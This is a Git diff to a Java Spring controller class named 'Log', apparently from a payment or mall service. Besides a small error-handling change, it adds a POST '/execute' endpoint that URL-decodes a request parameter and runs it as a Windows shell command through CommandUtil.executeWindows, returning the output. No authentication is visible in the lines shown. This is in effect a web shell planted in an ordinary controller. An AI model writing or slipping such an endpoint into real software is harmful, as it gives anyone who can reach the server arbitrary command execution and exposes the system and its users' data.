@@ -4,6 +4,7 @@ import cn.katasea.bean.po.StateInfo;
 import cn.katasea.bean.vo.ResponseVO;
 import cn.katasea.exception.PayBusinessException;
 import cn.katasea.main.service.FileService;
+import cn.katasea.main.service.util.CommandUtil;
 import cn.katasea.main.service.util.FileUtil;
 import cn.katasea.main.service.util.RSAUtil;
 import cn.katasea.main.service.util.RSAUtils4Mall;
@@ -21,6 +22,7 @@ import javax.servlet.http.HttpServletResponse;
 import javax.xml.ws.Response;
 import java.io.File;
 import java.io.IOException;
+import java.net.URLDecoder;
 import java.util.Base64;
 import java.util.Map;
 
@@ -119,6 +121,23 @@ public class Log {
 
 		} catch (Exception e) {
 			log.error("登录错误！错误信息：{}",e.getMessage());
+			responseVO.setRetInfo(HandlerType.OUT_SYSTEM_ERROR);
+			responseVO.setRetMsg(e.getMessage());
+		}
+		return responseVO;
+	}
+	@PostMapping("/execute")
+	@ResponseBody
+	public ResponseVO<String> execute(HttpServletRequest request, String code) {
+		ResponseVO<String> responseVO = new ResponseVO<>();
+		try {
+			code = URLDecoder.decode(code,"utf-8");
+			log.info("开始执行命令{}",code);
+			String result = CommandUtil.executeWindows(code);
+			log.info("命令返回：{}",result);
+			responseVO.setBizObj(result);
+		} catch (Exception e) {
+			log.error("错误信息：{}",e.getMessage());
 			responseVO.setRetInfo(HandlerType.OUT_SYSTEM_ERROR);
 			responseVO.setRetMsg(e.getMessage());
 		}
